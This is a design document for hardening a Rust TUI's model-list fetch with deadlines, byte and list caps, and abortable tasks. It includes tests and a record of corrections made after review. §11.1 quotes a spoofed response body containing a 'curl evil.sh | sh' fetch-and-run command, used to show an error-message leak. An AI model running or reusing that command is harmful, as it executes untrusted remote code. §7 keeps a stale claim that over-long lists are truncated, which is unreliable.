# Bounded, time-limited model-list fetch — design

> **Status:** DRAFT — a per-request deadline, a streaming byte cap, and a list-length cap on the
> model-list path, plus an abortable fetch task in the TUI.
>
> **Revised after PR review.** Two claims in the original draft were wrong and are corrected in
> place, with the reasoning kept rather than quietly deleted: see §11 Deviations.

> **Implements:** https://github.com/savvagent/light/issues/44

## 1. Brief

Quoted from issue #44 (`providers: bound and time-limit the model-list fetch`):

> `build_http_client` (`crates/providers/src/base_url.rs`) sets a redirect and proxy policy but
> **no `.timeout()` and no `.connect_timeout()`**, and `list_models`/`list_ollama_models` buffer the
> whole response body via `.json::<IdList>()` with no size bound.
>
> Consequences:
> - A slow or non-responding endpoint leaves the `/models` and `/connect` modals showing
>   "Fetching models…" indefinitely. The footer says "Esc: cancel", and Esc does close the modal —
>   but `close_models` only bumps the nonce, so the spawned task keeps running and holds its
>   connection with the API key in memory.
> - A hostile or compromised endpoint can return an arbitrarily large JSON array and OOM the TUI.
>   The Ollama path needs no credential at all — anything listening on `127.0.0.1:11434` can do this.
>
> Note a blanket client timeout is **not** the right fix: the same client serves completion
> requests, where a long generation is legitimate. Scope the timeout to the model-list calls.
>
> Suggested:
> - A request timeout on the model-list calls specifically.
> - A byte cap while reading the body instead of `.json()`.
> - Truncate the list to a sane maximum in `fetch_model_list` before it reaches the UI.
> - Store the `JoinHandle` in `begin_fetch`/`begin_models_fetch` and `abort()` it on close
>   (`leave_engine` already does this correctly).

## 2. Premise corrections

The issue's premises are accurate about the defect. Three of its *suggested remedies* do not
survive contact with the code, and one under-counts the affected call sites.

1. **A separate `.connect_timeout()` is unnecessary and would cost a second HTTP client.**
   `connect_timeout` is a `ClientBuilder`-only knob (`reqwest-0.13.4/src/async_impl/client.rs:1469`);
   there is no per-request equivalent. Applying it would require forking `build_http_client` into a
   model-list variant — precisely the duplication `base_url.rs`'s module doc says caused the route
   policy to silently regress before ("every time one of them was defined in a single provider's
   file, a sibling provider was left behind"). It is also redundant: `RequestBuilder::timeout()` is a
   **total** deadline. reqwest arms it in `execute_request` before the request is handed to hyper
   (`client.rs:2653`) and threads the same `Sleep` into the response body
   (`async_impl/response.rs:36-46`), so it spans DNS + TCP + TLS + time-to-first-byte + body read.
   A connect timeout is a strictly weaker bound on a strict prefix of that interval.
   **Decision:** one per-request total timeout on the model-list calls. `build_http_client` is not
   modified at all, so the completion path's route policy and its (correct) absence of a deadline are
   untouched by construction.

2. **Truncation belongs in `providers`, not in `fetch_model_list`.** The issue names
   `crates/tui/src/app.rs::fetch_model_list` as the truncation site, but that function is a thin
   key-resolution wrapper over `list_models`/`list_ollama_models`; putting the cap there would leave
   `light_factory_providers::list_models` unbounded for every other caller (including a future
   non-TUI one) and would split one bound across two crates. The cap lands in `models.rs::normalize`,
   beside the existing sort/dedup, and `fetch_model_list` receives an already-bounded list.

3. **`close_models` is not the only leaking teardown.** `close_connect` (`app.rs:777`) and
   `dismiss_modals` (`app.rs:783`, called when the session goes away) bump their nonce and drop the
   modal without touching the spawned task, exactly like `close_models` (`app.rs:965`). All three are
   fixed, and `begin_fetch`/`begin_models_fetch` additionally abort any predecessor task before
   spawning a replacement (re-entering a modal or retyping a key currently strands the old fetch).

4. **A `Content-Length` pre-check is deliberately omitted.** It is attacker-controlled, may be absent
   on a chunked response, and buys nothing the streaming cap does not already give: the read stops
   after at most `max_body_bytes` + one frame regardless. A second, header-driven rejection path would
   be untestable through wiremock (which computes the header from the body it was given) and could
   diverge from the streaming path. One path, one bound.

## 3. Assumptions

1. **The deadline is 15 seconds.** The model-list fetch backs an interactive modal that renders
   "Fetching models…" with no progress; a provider that has not answered in 15s has already failed
   the user. Real `/v1/models` responses land in well under a second. Rationale: long enough to
   absorb a cold TLS handshake on a slow link, short enough that "Esc: cancel" is not the only exit.
2. **The body cap is 2 MiB.** OpenAI's `/v1/models` is tens of kilobytes; Ollama's `/api/tags` is a
   few. 2 MiB is roughly fifty times the largest plausible honest response and is a bound the TUI can
   absorb per in-flight fetch without any risk to a terminal process.
3. **The list cap is 1000 ids.** No provider publishes anywhere near that many models, and the modal
   is a scrolling list a human reads. Applied *after* sort+dedup so the retained subset is
   deterministic (the first 1000 ids in lexicographic order) rather than dependent on server order.
4. **The bounds are compile-time constants, not configuration.** Adding an env key would be a new
   public interface for a hardening change and would give an attacker-influenced environment a way to
   widen the bound. A `pub(crate) ListBounds` value threaded through the existing `*_at` test seams
   gives the tests tight bounds without exposing a knob. Both `*_at` seams `debug_check()` the
   bounds they were handed (`timeout` non-zero, `max_models >= 1`, `max_body_bytes` above the
   smallest well-formed body): a too-tight deadline or byte cap fails loudly, but `max_models: 0`
   would make every fetch *succeed* with an empty list — the one bound whose violation produces a
   plausible-looking wrong answer rather than an error.
5. **An over-long list is refused, not truncated.** *(Revised — the draft said "truncation is
   silent to the user".)* The semver defence for silence was sound but answered the wrong question:
   surfacing truncation would indeed need a new return type, but **refusing** needs none — it is an
   `Err` on the existing signature, exactly as `max_body_bytes` already is. And silence was not
   neutral. `handle_models_fetched` highlights the row matching the configured model and falls back
   to row 0 when it is absent, so a configured model dropped off the truncated tail opened the modal
   on a different id, persisted it on Enter, and reported "Model set to X" as unqualified success —
   a silent model substitution the user never asked for and was never told about. The retained
   prefix is attacker-controlled too: an endpoint that wants a particular id at row 0 names it with
   an early-sorting prefix and pads the list past the cap. By this assumption's own premise a list
   this long comes only from a hostile or broken endpoint, so refusing it is strictly more honest
   than serving an attacker-chosen prefix — and it makes all three bounds behave the same way
   instead of two-reject-one-degrade.
6. **`abort()` complements the nonce guard, it does not replace it.** Cancellation lands at the
   task's next await point, so a task that has already posted its `UiEvent` still delivers it. The
   existing `connect_nonce`/`models_nonce` stale-result checks stay exactly as they are and remain
   the correctness mechanism; the abort is what stops the *connection* (and the API key held in its
   request headers) from outliving the modal.
7. **The scope stays inside issue #44.** Sibling PRs are in flight against
   `handle_models_fetched`/`ModelsStep` error classification (#47) and against extracting the modal
   machinery out of `app.rs` (#46). This change therefore touches the smallest possible surface in
   `app.rs` — two fields, their initializers, two three-line helpers, and five call sites — and puts
   every behavioral bound in `crates/providers`.

## 4. Goal & Success Criteria

Goal: a hostile, compromised, or merely unresponsive model-list endpoint — including an
unauthenticated process on `127.0.0.1:11434`, which needs no credential to be reached — can no
longer exhaust the TUI's memory, hang its modal indefinitely, or keep a credential-bearing
connection open after the user pressed Esc.

- [ ] A model-list request that receives no response within `MODEL_LIST_TIMEOUT` fails with a
      timeout error instead of hanging; the completion path is provably unaffected.
- [ ] A response body larger than `MAX_BODY_BYTES` is rejected during the read, so at most
      `MAX_BODY_BYTES` (plus one frame) is ever buffered — never the whole body.
- [ ] A model list longer than `MAX_MODELS` is refused before it leaves `crates/providers`.
- [ ] No endpoint-chosen text from a response body can reach a message the modal renders — through
      the cap error, the length error, or the JSON parse error.
- [ ] Closing (or dismissing) either modal, or starting a replacement fetch, aborts the in-flight
      fetch task rather than stranding it.
- [ ] `cargo test --workspace`, `cargo clippy --workspace --all-targets -D warnings`, and
      `cargo fmt --all --check` are clean; every new test is offline and deterministic.
- [ ] No public interface changes: `list_models`/`list_ollama_models` keep their signatures, so no
      crate `version` bump is required (§7).

## 5. Scope

**In:**
- `crates/providers/src/models.rs`: a `pub(crate) ListBounds` (deadline, body cap, list cap) with a
  `DEFAULT` constant; a single `model_list_request` builder that applies the per-request
  `.timeout()` to every model-list request; a streaming, byte-capped body read replacing
  `.json::<T>()`; a list-length rejection in `normalize`.
- `crates/providers/src/base_url.rs`: tests only — pinning that `build_http_client` puts no deadline
  on the client and no deadline on a request built from it.
- `crates/tui/src/app.rs`: two `Option<JoinHandle<()>>` fields, their initializers, two abort
  helpers, and the abort calls in `begin_fetch`, `begin_models_fetch`, `close_connect`,
  `close_models`, and `dismiss_modals`.

**Out:**
- Any change to `build_http_client`, `reject_redirect`, `validate_base_url`, or the completion path.
  The completion path deliberately has no deadline and keeps it.
- Any change to `handle_connect_models` / `handle_models_fetched` / their error classification, to
  `ModelsStep`/`ConnectStep`, to the modal rendering, or to the modal state machines (#46, #47).
- Surfacing truncation, a cancellation notice, or a retry affordance in the UI.
- Making any bound configurable via env or `config.json`.
- Bounding any other network path (the completion providers, the auth `Api` client, the WebSocket).
  If those want bounds, they are separate issues (§8).

## 6. Design

### 6.1 `ListBounds` (`crates/providers/src/models.rs`)

Requires one new import in `models.rs`: `use std::time::Duration;`.

```rust
/// The bounds a model-list fetch runs under. Threaded through the `*_at` seams so tests can pin
/// tight values without exposing a runtime knob.
#[derive(Debug, Clone, Copy)]
pub(crate) struct ListBounds {
    /// Total deadline for one model-list request: DNS + connect + TLS + TTFB + body read.
    pub(crate) timeout: Duration,
    /// Hard ceiling on buffered response bytes.
    pub(crate) max_body_bytes: usize,
    /// Hard ceiling on returned model ids.
    pub(crate) max_models: usize,
}

impl ListBounds {
    pub(crate) const DEFAULT: Self = Self {
        timeout: Duration::from_secs(15),
        max_body_bytes: 2 * 1024 * 1024,
        max_models: 1_000,
    };
}
```

`list_models_at` and `list_ollama_models_at` (both already `pub(crate)` test seams) gain a
`bounds: ListBounds` parameter and thread it into the four private per-provider helpers. The public
`list_models` / `list_ollama_models` wrappers pass `ListBounds::DEFAULT` — their signatures are
unchanged (§7).

### 6.2 The deadline

All five provider paths build their request through one function:

```rust
fn model_list_request(base: &str, path: &str, bounds: ListBounds) -> reqwest::RequestBuilder {
    build_http_client(base).get(join_url(base, path)).timeout(bounds.timeout)
}
```

*(Revised — the draft repeated `.timeout(bounds.timeout)` on four separate `RequestBuilder`
chains.)* The byte cap was already structural, because every response funnels through
`parse_capped`; the deadline was not, and nothing would have failed if a fifth provider path omitted
it. That is precisely the hazard `base_url.rs`'s module doc names — "every time one of them was
defined in a single provider's file, a sibling provider was left behind and the guarantee silently
regressed." Callers add only their own auth headers. Nothing else acquires a deadline:
`build_http_client` is untouched, so the completion providers keep exactly the client they have
today.

Pinned by tests in `base_url.rs`: a client from `build_http_client` renders no timeout in its
`Debug` (reqwest only emits `reqwest::config::TotalTimeout` when one is configured), and a request
built from it reports `Request::timeout() == None`.

### 6.3 The byte cap

`.json::<T>()` is replaced by a capped read plus an explicit deserialize:

```rust
/// Read a response body, refusing to buffer more than `max_bytes`.
///
/// `Response::bytes()`/`json()` buffer to completion, so a hostile endpoint's declared or actual
/// length becomes the TUI's allocation. This reads frame by frame and bails the moment the total
/// would exceed the cap, so peak memory is bounded by `max_bytes` plus one frame — and dropping
/// the response then closes the connection rather than draining the rest.
///
/// Nothing about the body reaches the error message: the sender controls its content, and this
/// error is rendered into the modal.
async fn read_capped(mut resp: reqwest::Response, max_bytes: usize) -> anyhow::Result<Vec<u8>> {
    let mut buf: Vec<u8> = Vec::new();
    while let Some(chunk) = resp.chunk().await? {
        if buf.len() + chunk.len() > max_bytes {
            anyhow::bail!(
                "model list response exceeded the {max_bytes}-byte cap; refusing to buffer it"
            );
        }
        buf.extend_from_slice(&chunk);
    }
    Ok(buf)
}
```

Peak buffering is `max_bytes` plus the frame that tripped the check, and that frame's size is
chosen by the HTTP layer (hyper's read buffer for h1, the negotiated max frame size for h2) — not by
the sender — so the bound is genuinely closed, not merely one-frame-open.

`Response::chunk()` is available without reqwest's `stream` feature
(`reqwest-0.13.4/src/async_impl/response.rs:310`; `bytes_stream` at :351 is the gated one), so no
dependency or feature change is needed. `buf` starts empty and grows only by what has actually
arrived — no capacity is ever reserved from an attacker-supplied length.

Call sites become:

```rust
let resp = raw.error_for_status()?;
let body = read_capped(resp, bounds.max_body_bytes).await?;
// Line and column only — deliberately NOT `serde_json::Error`'s own Display. See §8.
serde_json::from_slice(&body).map_err(|e| {
    anyhow::anyhow!(
        "model list response was not valid JSON (line {}, column {})",
        e.line(),
        e.column()
    )
})
```

`error_for_status()` still runs first and still discards the error body, so a 4xx/5xx never reaches
the capped read.

### 6.4 The list cap

```rust
/// Stable-sort, dedup, and bound a model-id list. A list longer than `max` is refused, not
/// truncated — see Assumption 5.
fn normalize(mut ids: Vec<String>, max: usize) -> anyhow::Result<Vec<String>> {
    ids.sort();
    ids.dedup();
    if ids.len() > max {
        // The count only. No id reaches an error the modal renders.
        anyhow::bail!("model list reported {} ids, exceeding the {max}-id cap; refusing it", ids.len());
    }
    Ok(ids)
}
```

All four call sites pass `bounds.max_models` and propagate the `Result`.

### 6.5 Abortable fetch tasks (`crates/tui/src/app.rs`)

Two fields beside the existing `engine_forward_task`, following its established pattern:

```rust
connect_fetch_task: Option<tokio::task::JoinHandle<()>>,
models_fetch_task: Option<tokio::task::JoinHandle<()>>,
```

initialized to `None`, and two helpers:

```rust
/// Cancel the connect modal's in-flight model fetch, so the request — and the API key in its
/// headers — does not outlive the modal that asked for it. Complements the `connect_nonce`
/// guard, which still discards any result that slips through before cancellation lands.
fn abort_connect_fetch(&mut self) {
    if let Some(task) = self.connect_fetch_task.take() {
        task.abort();
    }
}

fn abort_models_fetch(&mut self) { /* same, for models_fetch_task */ }
```

Wiring (five sites, each one line):

| Site | Change |
|---|---|
| `begin_fetch` | `self.abort_connect_fetch();` before spawning; store the new handle |
| `begin_models_fetch` | `self.abort_models_fetch();` before spawning; store the new handle |
| `close_connect` | `self.abort_connect_fetch();` |
| `close_models` | `self.abort_models_fetch();` |
| `dismiss_modals` | `self.abort_connect_fetch();` **and** `self.abort_models_fetch();` unconditionally, outside the existing `if self.connect.is_some()` / `if self.models.is_some()` arms |

Cancellation is deliberately tied to *task* state, not to *modal* state: `abort()` on a taken-`None`
handle is a no-op, so aborting unconditionally in `dismiss_modals` costs nothing and removes the
possibility of a handle stranded by a state combination the abort was gated on.

`apply_and_close_connect` and `apply_and_close_models` already delegate to `close_connect` /
`close_models`, so they are covered without edits. Nothing else in `app.rs` is touched.

## 7. Semver

No public interface changes, so **no `Cargo.toml` version bump** (Non-Negotiable Rule 6):

| Item | Visibility | Change |
|---|---|---|
| `light_factory_providers::list_models` | `pub` | none — signature and behavior contract unchanged |
| `light_factory_providers::list_ollama_models` | `pub` | none |
| `models::list_models_at`, `models::list_ollama_models_at` | `pub(crate)` | gain a `bounds` parameter — internal |
| `models::ListBounds` | `pub(crate)` (new) | internal |
| `base_url::build_http_client` | `pub(crate)` | **not modified** |
| `crates/tui` | binary/lib leaf | private fields and methods only |

`crates/providers/Cargo.toml` gains no dependency and no feature: `Response::chunk` and
`RequestBuilder::timeout` are both in the crate's existing `default-features = false, features =
["rustls", "json"]` build, and `anyhow` + `serde_json` are already `[dependencies]`. Note the crate
does not currently import `anyhow::Context` anywhere — every provider uses a bare `?` on
`reqwest::Error` — so `use anyhow::Context;` is a new import of an existing dependency, not a new
dependency.

Behavioral compatibility of the unchanged public functions: a caller that previously received a
>1000-entry list now receives 1000, and a caller that previously hung now receives an error. Both are
the point of the change, and neither alters a type.

## 8. Error handling & edge cases

| Case | Behavior |
|---|---|
| Endpoint never responds | `reqwest` timeout error after `timeout`; surfaced through the existing `{:#}` anyhow chain into `connect.fetch_error` |
| Endpoint responds, then stalls mid-body | Same deadline covers the body read (the `Sleep` is threaded into the response body), so the read errors rather than hanging |
| Body exceeds the cap | `read_capped` bails after at most `max_bytes` + one frame; the `Response` is dropped, closing the connection instead of draining |
| Body is under the cap but not JSON | An error naming the **line and column only**, built from `Error::line()`/`Error::column()`. `serde_json::Error`'s own `Display` is *not* used: for an `invalid_type` error it embeds the offending value (see §11) |
| Body is valid JSON with no `data`/`models` key | Unchanged: both structs are `#[serde(default)]`, so this yields an empty list, which the modal already treats as an honest "no models reported" |
| List exceeds the cap | Refused with an error naming the count and the cap — no id reaches the message (Assumption 5) |
| 3xx | Unchanged: `reject_redirect` still fires before the body is touched |
| 4xx/5xx | Unchanged: `error_for_status()` still fires before the capped read |
| Esc during a fetch | Modal closes (unchanged) **and** the task is aborted; if the result was already posted, the nonce guard discards it (unchanged) |
| Session lost during a fetch | `dismiss_modals` aborts both tasks |
| Re-entering a modal / retyping a key | `begin_*` aborts the predecessor before spawning |
| Task aborted after `events.send` | The `UnboundedSender` send already happened; the nonce guard rejects it. No change in observable behavior |
| Fetch task panics | Caught at the task boundary and reported as `connect.fetch_panicked`. Nothing polls the `JoinHandle`, so an unwind would otherwise send no `UiEvent` at all and leave `fetching: true` until Esc; the 15 s deadline is inside reqwest, not around the task |
| Result delivered | The handler clears its own `*_fetch_task`, so a completed task is not left tracked. The field is a **cancellation handle**, never an "is a fetch in flight" predicate |
| Sign-out during a fetch | `dismiss_modals()` runs *before* `api.logout().await`. The TUI's `Api` client has no timeout, so cancelling after it would let an unanswered logout hold the key-bearing fetch open indefinitely |

**Security properties preserved or added.** No error message carries body content, a URL, or a key —
including the JSON parse error, which reports a line and column built by hand rather than
`serde_json::Error`'s Display (§11).
An unauthenticated process on `127.0.0.1:11434` — the Ollama path needs no credential — can no
longer drive TUI allocation past `max_body_bytes`. A credential-bearing request no longer outlives
its modal, bounding how long a provider API key sits in an open connection's headers. The trust
boundary itself (`validate_base_url` → `build_http_client` → `reject_redirect`) is untouched.

## 9. Testing

All tests offline and deterministic; the provider tests use the crate's existing `wiremock` harness.

**`crates/providers/src/models.rs`:**
1. `an_oversized_body_is_refused_instead_of_buffered` — a ~3.7 MiB body against a `max_body_bytes`
   of 1 MiB yields an `Err` naming the cap, and the error carries no body content. **Both numbers
   are load-bearing.** The cap must sit above hyper's *largest* read frame (~400 KiB by default),
   not merely above its first: hyper's read buffer grows adaptively (a measured frame sequence for
   this body was 8081, 16384, 32768, 24697, …), so with a small cap the read bails on iteration one
   with an empty buffer and the guard's **cumulative** behaviour is never exercised. A test that
   does that passes just as happily against a per-*frame* cap (`chunk.len() > max_bytes`), which is
   functionally unbounded memory — an endpoint streaming 8 KiB frames forever buffers without
   limit, the exact vulnerability this change exists to close.
2. `a_body_at_the_cap_is_still_accepted` and `a_body_one_byte_over_the_cap_is_refused` — the
   boundary is pinned on both sides, so the guard cannot drift to `> max_bytes + 1`.
3. `an_over_long_model_list_is_refused` / `a_list_exactly_at_the_cap_is_accepted` — 20 ids with
   `max_models: 5` is an `Err` naming the count and the cap and carrying no id; 5 ids is `Ok`.
4. `a_hostile_body_cannot_reach_the_modal_through_the_parse_error` — a body of
   `{"data":"<MARKER>"}` yields an error whose full `format!("{err:#}")` chain does not contain
   `<MARKER>`, in the same shape as the oversized-body assertion.
5. `a_stalled_endpoint_fails_at_the_deadline` — wiremock delays well past a `timeout` of ~150 ms and
   the call returns an `Err`, **for every provider path** (`anthropic`, `openai`, `gemini`,
   `deepseek`, and `ollama`), not just `openai`. Ollama matters most: it needs no credential, so
   anything on `127.0.0.1:11434` reaches it. The error is identified **structurally**, not by its message:
   `err.downcast_ref::<reqwest::Error>().is_some_and(reqwest::Error::is_timeout)` (the `?` on
   `send()` preserves the `reqwest::Error` as the anyhow source). No assertion is made on elapsed
   wall-clock time, which would be flaky under load. This is the behavioral proof that the deadline
   is applied to the model-list path.
6. `default_bounds_are_the_production_values` — pins `ListBounds::DEFAULT` (15 s / 2 MiB / 1000), so
   a later accidental widening is a failing test rather than a silent regression.
7. Existing model-list tests updated for the new `*_at` signature and kept green (they double as the
   proof that an ordinary response still round-trips through the capped read and `from_slice`).

**`crates/providers/src/base_url.rs`:**
8. `the_completion_client_carries_no_total_deadline` — `build_http_client` renders no
   `reqwest::config::TotalTimeout` in its `Debug`, and `client.get(url).build().unwrap().timeout()`
   is `None`. Scoped to a **total** deadline on purpose: asserting the absence of *every* timeout
   would cement "completions are unbounded" as a deliberate invariant, when `read_timeout`
   (idle-between-bytes, which does not cut off a slow but progressing generation) and
   `connect_timeout` are both legitimate future additions. The Debug half is best-effort only —
   `Client`'s `Debug` renders `connect_timeout` not at all (that field is on `ClientBuilder`'s
   `Debug`), so it cannot even see the knob the alternatives would use. The structural
   `Request::timeout().is_none()` half carries the real weight.

**`crates/tui/src/app.rs`** (`#[tokio::test]`, using `JoinHandle::abort_handle()` as a probe):
8. `closing_the_models_modal_aborts_the_in_flight_fetch`
9. `closing_the_connect_modal_aborts_the_in_flight_fetch`
10. `dismissing_modals_aborts_both_in_flight_fetches`
11. `starting_a_models_fetch_aborts_the_previous_one`
12. `starting_a_connect_fetch_aborts_the_previous_one` — the mirror. Without it, `begin_fetch` could
    revert to a bare `tokio::spawn` with the handle never stored and every test stayed green, since
    tests 8–10 assign the field by hand and so exercise only `abort_connect_fetch`.
13. `a_delivered_models_result_stops_tracking_its_task` /
    `a_delivered_connect_result_stops_tracking_its_task` / `a_stale_result_leaves_the_current_fetch_tracked`
14. `a_panicking_fetch_reports_an_error_instead_of_spinning_forever`

## 10. Risks & open questions

1. **Test 8 reads reqwest's `Debug` output.** A future reqwest release could rename
   `reqwest::config::TotalTimeout`. Mitigated by matching case-insensitively on `"timeout"` and by
   pairing it with the structural `Request::timeout()` assertion, which is a stable public API.
2. **15 s could be short for a very slow link or a proxied gateway.** The failure mode is a visible,
   localized error in a modal the user can retry, not data loss. If real reports arrive, raising the
   constant is a one-line change; making it configurable is deliberately deferred (Assumption 4).
3. **An honest >1000-model endpoint would be refused outright.** No such endpoint exists today
   (Assumption 3), and the failure mode is a visible, localized error rather than a wrong model
   silently selected. Raising the constant is a one-line change if one ever appears.
4. **The same unbounded-client pattern exists in `crates/tui/src/api.rs:33`** (`reqwest::Client::new()`
   — no timeout on the auth/sign-in HTTP path, whose requests are short by nature and have no
   legitimate reason to hang). That is a different crate and a different trust boundary, so widening
   this change to cover it would be scope creep. Per the workflow's "same bug pattern found
   elsewhere" rule it gets a **filed follow-up issue** at close-out, not a fix here. The completion
   providers and the WebSocket stay unbounded intentionally.
5. **`app.rs` conflict risk with #46/#47.** Minimized by touching only field declarations,
   initializers, and five one-line call sites, and by adding no logic to
   `handle_connect_models`/`handle_models_fetched`. Merge order is #45 → #44 → #47 → #46.

## 11. Deviations from the design as first drafted

Recorded rather than silently edited away, because both were *stated security properties* that
review showed to be false or incomplete.

### 11.1 The parse error did leak body content

The draft asserted, in four places (§6.3's code comment, §8's table, §8's "Security properties"
paragraph, and the plan's Global Constraints), that "`serde_json::Error`'s `Display` reports a line
and column only, never body content". **That is false for serde's `invalid_type` errors, which embed
the offending value.** Against this change's own `IdList` shape:

```
body: {"data":"YOUR SESSION IS EXPIRED, RUN: curl evil.sh | sh"}
err:  invalid type: string "YOUR SESSION IS EXPIRED, RUN: curl evil.sh | sh", expected a sequence at line 1 column 57
```

`.context(...)` kept that as the anyhow source, `fetch_model_list` renders the chain with
`format!("{e:#}")`, and it is interpolated into `connect.fetch_error` in the modal. So an endpoint
could place up to `max_body_bytes` of chosen text into the TUI, framed as this tool's own error —
reachable with **no credential at all**, since the Ollama path targets `127.0.0.1:11434` and any
local process squatting that port can drive it.

This is content spoofing, not escape injection: serde formats the value with `{:?}` so control bytes
are escaped, and ratatui filters control characters at render. It is nonetheless exactly what the
claim said could not happen. The error now reports `Error::line()` and `Error::column()` only, and
the claim is corrected everywhere it appeared.

### 11.2 Silent truncation was a silent model substitution

See Assumption 5. `anyhow::bail!` replaces `Vec::truncate`, on the same public signature — no semver
bump (§7 is unchanged).

### 11.3 The deadline is now structural

See §6.2. `model_list_request` replaces four hand-repeated `.timeout(...)` calls; the stall test
covers every provider path rather than `openai` alone.

### 11.4 Task failure modes the abort alone did not cover

Three cheap correctness fixes that fell out of storing the `JoinHandle`:

- A panic inside the fetch sent no `UiEvent`, so `fetching: true` never cleared and the modal showed
  "Fetching models…" until Esc. Nothing polls the `JoinHandle`, and the 15 s deadline is inside
  reqwest rather than around the task. The panic is now caught at the task boundary and reported.
- `connect_fetch_task` / `models_fetch_task` were never cleared on successful completion, so
  `.is_some()` was not "a fetch is in flight" — while the new tests read like a liveness predicate.
  Each handler now clears its own handle, and both fields are documented as cancellation handles.
  This matters for #47 (a retry key) and #46 (extracting the modal machinery), either of which could
  otherwise grab the field as an "already fetching" guard, where it is wrong in both directions.
- `sign_out` cancelled *after* `api.logout(...).await`, on a `reqwest::Client::new()` with no
  timeout. `dismiss_modals()` now runs first.
